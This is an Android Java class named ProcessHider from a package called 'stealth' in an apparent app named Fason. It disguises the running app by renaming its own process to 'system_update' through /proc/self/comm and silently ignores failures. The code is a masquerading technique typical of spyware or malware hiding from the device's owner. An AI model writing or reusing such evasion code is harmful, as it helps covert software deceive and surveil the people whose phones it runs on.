package com.fason.app.stealth;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Build;
import android.util.Log;
import com.fason.app.core.FasonApp;

public final class ProcessHider {
    private static final String TAG = "ProcessHider";

    public static void hide() {
        try {
            Context ctx = FasonApp.getContext();
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am == null) return;
            renameProcess("system_update");
        } catch (Exception e) {
            Log.w(TAG, "Hide failed", e);
        }
    }

    private static void renameProcess(String name) {
        try {
            java.io.FileWriter fw = new java.io.FileWriter("/proc/self/comm");
            fw.write(name);
            fw.close();
        } catch (Exception ignored) {}
    }
}
